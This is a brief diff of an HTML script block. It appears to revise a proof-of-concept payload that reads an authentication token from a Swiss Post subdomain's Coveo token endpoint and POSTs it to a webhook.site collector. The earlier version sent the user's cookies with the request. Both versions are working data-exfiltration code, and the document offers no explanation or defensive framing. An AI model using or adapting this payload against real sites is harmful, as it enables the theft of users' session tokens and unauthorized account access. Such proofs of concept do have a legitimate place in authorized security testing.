@@ -1,15 +1,15 @@
 <script>
-  fetch("https://example1.post.ch/", {
-    method: "GET",
-    credentials: "include"  // This will send the user's cookies
-  })
-  .then(response => response.text())
-  .then(data => {
-    fetch("https://webhook.site/5beb3f37-64a6-4b44-aa9b-372678d00ba8", {  // Replace with your webhook
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ token: data })
-    });
-  })
-  .catch(error => console.error("Error:", error));
+  fetch('https://example1.post.ch/coveo/rest/token')
+    .then(response => response.text())
+    .then(data => {
+      // Replace with your webhook URL to capture data
+      fetch('https://webhook.site/5beb3f37-64a6-4b44-aa9b-372678d00ba8', {
+        method: 'POST',
+        body: JSON.stringify(data)
+      });
+    })
+    .catch(error => console.error('Error:', error));
 </script>
+
+
+
